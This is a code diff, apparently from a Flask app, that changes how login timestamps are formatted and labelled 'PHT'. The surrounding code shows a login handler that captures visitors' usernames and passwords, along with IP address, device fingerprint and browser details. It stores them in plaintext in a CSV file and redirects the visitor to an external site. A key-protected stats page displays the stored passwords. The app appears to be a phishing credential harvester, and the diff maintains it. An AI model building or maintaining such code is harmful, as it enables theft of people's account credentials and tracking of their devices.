@@ -53,10 +53,11 @@ def login():
     device_fingerprint = generate_device_fingerprint()
     browser_info = get_browser_info()
     
-    # Save the complete data with timestamp in 12-hour format - use the actual current time
-    # No timezone adjustment needed - just use the local time
+    # Get exact current time in 12-hour format
+    # This should reflect the exact time when the login occurs
     timestamp = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')
     
+    # Save the data with the exact timestamp
     save_full_data("", "", username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
     
     # Redirect to external site
@@ -268,9 +269,11 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
     script_dir = os.path.dirname(os.path.abspath(__file__))
     csv_path = os.path.join(script_dir, 'data.csv')
     
-    # Just add PHT label without any time conversion
-    # This ensures we don't modify the actual recorded time
-    timestamp_with_pht = timestamp + " PHT"
+    # Add PHT label if not already there
+    if "PHT" not in timestamp:
+        timestamp_with_pht = timestamp + " PHT"
+    else:
+        timestamp_with_pht = timestamp
     
     try:
         file_exists = os.path.isfile(csv_path)
@@ -329,7 +332,8 @@ def update_last_modified_timestamp(csv_path=None):
         script_dir = os.path.dirname(os.path.abspath(__file__))
         timestamp_file = os.path.join(script_dir, 'last_modified.txt')
         
-        # Get current timestamp in 12-hour format - use exact current time
+        # Get the exact current time in 12-hour format
+        # This should be the actual system time
         current_time = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
         
         # Write timestamp to file
@@ -380,26 +384,15 @@ def view_stats(access_key):
             try:
                 with open(path, 'r') as csvfile:
                     reader = csv.DictReader(csvfile)
-                    # Transform data to only include relevant fields
+                    # Get data exactly as stored
                     for row in reader:
                         entry = {}
-                        # Get username from the correct column
+                        # Username as stored
                         entry['username'] = row.get('username', '')
-                        # Password is already stored, will be hashed in template
+                        # Password as stored (will be hashed in template)
                         entry['password'] = row.get('password', '')
-                        # Get timestamp - use as is without conversion
+                        # Timestamp exactly as stored - no conversion
                         entry['timestamp'] = row.get('timestamp', '')
-                        
-                        # Only modify timestamps if they don't have PHT and aren't in 12-hour format
-                        if "PHT" not in entry['timestamp'] and ("AM" not in entry['timestamp'] and "PM" not in entry['timestamp']):
-                            try:
-                                # Try to convert to 12-hour format if it's in 24-hour format
-                                timestamp_dt = datetime.strptime(entry['timestamp'], '%Y-%m-%d %H:%M:%S')
-                                entry['timestamp'] = timestamp_dt.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
-                            except:
-                                # If parsing fails, just add PHT if needed
-                                if "PHT" not in entry['timestamp']:
-                                    entry['timestamp'] += " PHT"
                         
                         data.append(entry)
                 break  # Successfully read data, exit loop
